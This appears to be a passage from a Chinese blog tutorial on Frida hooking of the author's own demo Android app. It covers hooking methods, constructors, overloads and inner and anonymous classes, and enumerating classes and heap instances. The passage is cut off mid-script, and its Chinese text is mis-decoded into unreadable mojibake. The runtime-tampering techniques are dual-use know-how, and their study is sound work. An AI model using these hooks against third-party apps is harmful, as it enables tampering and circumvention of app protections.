&lt;LinearLayout</span><br><span class="line">        android:id=&quot;@+id/layout_add1&quot;</span><br><span class="line">        android:layout_width=&quot;match_parent&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_weight=&quot;1&quot;</span><br><span class="line">        android:orientation=&quot;horizontal&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;EditText</span><br><span class="line">            android:id=&quot;@+id/edt_add1&quot;</span><br><span class="line">            android:layout_width=&quot;198dp&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:autofillHints=&quot;&quot;</span><br><span class="line">            android:ems=&quot;5&quot;</span><br><span class="line">            android:hint=&quot;è¾“å…¥ä¸€ä¸ªæ•°&quot;</span><br><span class="line">            android:inputType=&quot;number&quot; /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;Button</span><br><span class="line">            android:id=&quot;@+id/btn_add1&quot;</span><br><span class="line">            android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">            android:text=&quot;add1()&quot; /&gt;</span><br><span class="line">    &lt;/LinearLayout&gt;</span><br><span class="line"></span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridademo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="keyword">private</span> EditText edtAdd1;</span><br><span class="line">    <span class="keyword">private</span> Button btnCreate;</span><br><span class="line">    <span class="keyword">private</span> Button btnAdd1;</span><br><span class="line">    <span class="keyword">private</span> Calc calc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        edtAdd1 = findViewById(R.id.edt_add1);</span><br><span class="line">        btnCreate = findViewById(R.id.btn_create);</span><br><span class="line">        btnCreate.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        btnAdd1 = findViewById(R.id.btn_add1);</span><br><span class="line">        btnAdd1.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_create:</span><br><span class="line">                calc = <span class="keyword">new</span> <span class="title class_">Calc</span>(<span class="number">1</span>);</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;å·²åˆ›å»ºä¸€ä¸ªCalc\nbase=&quot;</span> + calc.base, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_add1:</span><br><span class="line">                <span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(edtAdd1.getText()));</span><br><span class="line">                <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> calc.add(p1);</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;æ‰§è¡Œadd(p1)\nç»“æœ=&quot;</span> + res, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridademo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„é€ æ–¹æ³•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">(<span class="type">int</span> p1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.base = p1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ™®é€šæ–¹æ³•</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> num1ä¸baseç›¸åŠ ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num1)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base + num1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141738864.gif" alt="img"> </p><h1 id="0x01hookæ™®é€šå‡½æ•°"><a href="#0x01hookæ™®é€šå‡½æ•°" class="headerlink" title="0x01hookæ™®é€šå‡½æ•°"></a>0x01hookæ™®é€šå‡½æ•°</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var clazz = Java.use(&quot;com.zyc.fridademo.Calc&quot;);</span></span><br><span class="line"><span class="string">    clazz.add.implementation = function(p1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Hookå¼€å§‹...&quot;);</span></span><br><span class="line"><span class="string">        send(&quot;åŸp1=&quot;+p1);</span></span><br><span class="line"><span class="string">        console.log(&quot;Hookä¿®æ”¹å‚æ•°...&quot;);</span></span><br><span class="line"><span class="string">        p1+=100;</span></span><br><span class="line"><span class="string">        send(&quot;ç°p1=&quot;+p1);</span></span><br><span class="line"><span class="string">        return this.add(p1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message , data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process=frida.get_remote_device().attach(<span class="string">&#x27;com.zyc.fridademo&#x27;</span>)</span><br><span class="line">script=process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>å¯åŠ¨frida-serverï¼Œä½¿ç”¨ç«¯å£è½¬å‘ï¼Œæ‰§è¡Œä¸Šé¢çš„è„šæœ¬ï¼Œå³å¯å®ç°è¾“å…¥çš„æ•°å¢åŠ 100ä¹‹åå†æ‰§è¡ŒåŸå‡½æ•°ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141758219.gif" alt="img"> </p><h1 id="0x02-Hookæ„é€ å‡½æ•°"><a href="#0x02-Hookæ„é€ å‡½æ•°" class="headerlink" title="0x02 Hookæ„é€ å‡½æ•°"></a>0x02 Hookæ„é€ å‡½æ•°</h1><p>å¦‚æœæ˜¯Hookæ„é€ å‡½æ•°ï¼Œåªéœ€ä½¿ç”¨$initå¼•ç”¨ï¼Œå°†.pyçš„jséƒ¨åˆ†ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">p1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hookæ„é€ å¼€å§‹...&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;åŸp1=&quot;</span>+p1);</span><br><span class="line">        p1+=<span class="number">200</span>;</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;ç°p1=&quot;</span>+p1);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.$init(p1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141803614.gif" alt="img"> </p><h1 id="0x03-Hooké‡è½½å‡½æ•°"><a href="#0x03-Hooké‡è½½å‡½æ•°" class="headerlink" title="0x03 Hooké‡è½½å‡½æ•°"></a>0x03 Hooké‡è½½å‡½æ•°</h1><p>åœ¨Calcç±»ä¸­å¢åŠ ä¸€ä¸ªé‡è½½æ–¹æ³•add(int num1,String num2)ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num1,String num2)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> base + num1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºCalcä¸­æœ‰add(int num1)å’Œadd(int num1,String num2)ï¼Œåƒæ™®é€šå‡½æ•°é‚£æ ·Hookæ˜¯ä¼šæŠ¥é”™çš„ï¼Œæ¶‰åŠåˆ°é‡è½½å°±è¦ç”¨åˆ° <strong>overload()</strong> ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">add</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook add(int num1)...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">888</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clazz.<span class="property">add</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>,<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook add(int num1,String num2)...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">999</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141807919.gif" alt="img"> </p><p>å¦‚æœé‡è½½å‡½æ•°å¤šï¼Œå¯ä»¥é€šè¿‡ overloads è·å¾—å…¨éƒ¨é‡è½½å¯¹è±¡ï¼Œå¹¶é€šè¿‡jsçš„ <strong>apply</strong> å’Œ <strong>arguments</strong> ç‰¹æ€§ç»§ç»­ç¨‹åºæµç¨‹ã€‚ä¸‹é¢ä¾‹å­éå†äº†add(int a)å’Œadd(int a,String b)å‡½æ•°ï¼Œå¹¶ä¿®æ”¹äº†ä¸¤ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰“å°äº†ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> count = clazz.<span class="property">add</span>.<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">        clazz.<span class="property">add</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">arguments</span>[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="title function_">send</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">add</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141808583.gif" alt="img"> </p><h1 id="0x04-å®ä¾‹åŒ–ç±»"><a href="#0x04-å®ä¾‹åŒ–ç±»" class="headerlink" title="0x04 å®ä¾‹åŒ–ç±»"></a>0x04 å®ä¾‹åŒ–ç±»</h1><p>ä½¿ç”¨ <strong>$new()</strong> å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨MainActivity onCreate()æ—¶å®ä¾‹åŒ–ä¸€ä¸ªCalcï¼Œæ„é€ æ–¹æ³•ä¼ å…¥10ï¼ˆæŒ‰é’®å®ä¾‹åŒ–çš„ä¼ å…¥çš„æ˜¯1ï¼‰ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> calc = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">onCreate</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook MainActivity onCreate()...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myCalc = calc.$new(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141811689.gif" alt="img"> </p><h1 id="0x05-è®¿é—®ç±»çš„å±æ€§"><a href="#0x05-è®¿é—®ç±»çš„å±æ€§" class="headerlink" title="0x05 è®¿é—®ç±»çš„å±æ€§"></a>0x05 è®¿é—®ç±»çš„å±æ€§</h1><p>ç±»çš„å±æ€§å¯é€šè¿‡ <strong>.å±æ€§å.value</strong> è®¿é—®ã€‚å¦‚æœæœ‰å‡½æ•°ä¸å±æ€§åç›¸åŒï¼Œåˆ™éœ€è¦ä½¿ç”¨ä¸‹åˆ’çº¿æ–¹å¼ <strong>._å±æ€§å.value</strong> è®¿é—®ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> calc = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">onCreate</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook MainActivity onCreate()...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myCalc = calc.$new(<span class="number">10</span>);</span><br><span class="line">        <span class="title function_">send</span>(myCalc.<span class="property">base</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ä¿®æ”¹ä¸€ä¸‹base...&quot;</span>);</span><br><span class="line">        myCalc.<span class="property">base</span>.<span class="property">value</span> = <span class="number">88</span>;</span><br><span class="line">        <span class="title function_">send</span>(myCalc.<span class="property">base</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141813848.gif" alt="img"> </p><h1 id="0x06-hookå†…éƒ¨ç±»"><a href="#0x06-hookå†…éƒ¨ç±»" class="headerlink" title="0x06 hookå†…éƒ¨ç±»"></a>0x06 hookå†…éƒ¨ç±»</h1><p>ä½¿ç”¨ <strong>å¤–éƒ¨ç±»$å†…éƒ¨ç±»</strong> çš„å†™æ³•å¯ä»¥å®ç°å†…éƒ¨ç±»Hookï¼Œä¸ºäº†æµ‹è¯•ç®€å•æ”¹å†™ä¸€ä¸‹ç¨‹åºï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Calcç±»ä¸­å¢åŠ é™æ€å†…éƒ¨ç±»InnerClass</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ˜¯å†…éƒ¨ç±»&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MainActivityçš„onCreate()ä¸­åŠ å…¥ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»è§¦å‘InnerClassçš„print()æ–¹æ³•</span></span><br><span class="line">btnInnerClass = findViewById(R.id.btn_inner_class);</span><br><span class="line">btnInnerClass.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">txt</span> <span class="operator">=</span> Calc.InnerClass.print();</span><br><span class="line">        Toast.makeText(MainActivity.<span class="built_in">this</span>, txt, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Hookä»£ç ï¼Œä¿®æ”¹print()æ–¹æ³•çš„è¿”å›å€¼ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc$InnerClass&quot;</span>);</span><br><span class="line">    innerClazz.<span class="property">print</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ˜¯è¢«hookçš„å†…éƒ¨ç±»&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141814337.gif" alt="img"> </p><h1 id="0x07-HookåŒ¿åç±»"><a href="#0x07-HookåŒ¿åç±»" class="headerlink" title="0x07 HookåŒ¿åç±»"></a>0x07 HookåŒ¿åç±»</h1><p>çœ‹è¿‡smaliçš„éƒ½çŸ¥é“åŒ¿åç±»åç¼–è¯‘å‡ºæ¥æ˜¯ ç±»$æ•°å­— å½¢å¼ï¼Œå¦‚ä¸Šé¢è°ƒç”¨å†…éƒ¨ç±»æ–¹æ³•æ—¶åˆ›å»ºçš„View.OnClickListenerå°±æ˜¯ä¸€ä¸ªåŒ¿åç±»ï¼Œé€šè¿‡åç¼–è¯‘å·¥å…·èƒ½çœ‹åˆ°å…¶åç§°ä¸º <strong>MainActivity$1</strong>ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141815880.png" alt="img"> </p><p>äºæ˜¯å¯ä»¥åˆ©ç”¨fridaæ¥ç›‘å¬View.OnclickListeneræ–¹æ³•</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity$1&quot;</span>);</span><br><span class="line">    innerClazz.<span class="property">onClick</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;æ‰§è¡Œäº†åŒ¿åç±»ç‚¹å‡»æ–¹æ³•&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141815815.gif" alt="img"> </p><h1 id="0x08-éå†å·²åŠ è½½çš„ç±»ä¸ç±»æ–¹æ³•"><a href="#0x08-éå†å·²åŠ è½½çš„ç±»ä¸ç±»æ–¹æ³•" class="headerlink" title="0x08 éå†å·²åŠ è½½çš„ç±»ä¸ç±»æ–¹æ³•"></a>0x08 éå†å·²åŠ è½½çš„ç±»ä¸ç±»æ–¹æ³•</h1><p>ç”¨ <strong>enumerateLoadedClasses</strong> å¯ä»¥å¼‚æ­¥è·å–å·²åŠ è½½çš„ç±»ï¼Œå†é€šè¿‡ç±»ååå°„å³å¯è·å¾—ç±»æ–¹æ³•ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        onMatch : <span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.zyc.fridademo&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;methods.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141816498.png" alt="img"> </p><p>è¿™é‡Œå¼•ç”³ä¸€ä¸‹ç”¨ <strong>ç±»å˜é‡[æ–¹æ³•å]</strong> æ–¹å¼çš„Hookï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc$InnerClass&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> methods = innerClazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;methods.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> methodName = methods[i].<span class="title function_">getName</span>();</span><br><span class="line">        <span class="keyword">if</span>(methodName.<span class="title function_">indexOf</span>(<span class="string">&quot;print&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">            innerClazz[methodName].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="title function_">send</span>(<span class="string">&quot;æˆ‘æ˜¯åå°„æ¥çš„&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿è¡Œ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141816090.gif" alt="img"> </p><h1 id="0x09-éå†ç±»å®ä¾‹"><a href="#0x09-éå†ç±»å®ä¾‹" class="headerlink" title="0x09 éå†ç±»å®ä¾‹"></a>0x09 éå†ç±»å®ä¾‹</h1><p>ä½¿ç”¨ <strong>choose</strong> å¯æŸ¥æ‰¾å †ä¸­çš„ç±»å®ä¾‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> calc = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">onCreate</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook MainActivity onCreate()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–3ä¸ªCalc</span></span><br><span class="line">        calc.$new(<span class="number">2</span>);</span><br><span class="line">        calc.$new(<span class="number">3</span>);</span><br><span class="line">        calc.$new(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°æ¯ä¸ªå®ä¾‹çš„baseå€¼</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span> , &#123;</span><br><span class="line">            onMatch : <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found instance: &quot;</span>+instance);</span><br><span class="line">                <span class="title function_">send</span>(<span class="string">&quot;instance.base=&quot;</span>+instance.<span class="property">base</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span 